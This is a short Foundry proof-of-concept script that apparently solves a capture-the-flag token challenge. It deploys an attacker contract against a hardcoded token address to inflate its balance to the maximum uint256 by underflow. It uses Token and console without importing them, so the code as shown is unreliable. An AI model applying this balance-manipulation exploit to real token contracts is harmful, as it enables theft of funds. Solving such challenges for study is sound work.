// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Script} from "forge-std/Script.sol";
import {UnsafeMath} from "../challenges/5_Token.sol";

contract POC is Script {
    Token token = Token(0x813D92e2FCc7E453E161DDDFDE259369b6bF4294);

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        UnsafeMath unsafe = new UnsafeMath();
        console.log("Balance before: ", token.balanceOf(unsafe)); // 0

        unsafe.attack();

        console.log("Balance after: ", token.balanceOf(unsafe)); // max uint256

        vm.stopBroadcast();
    }
}
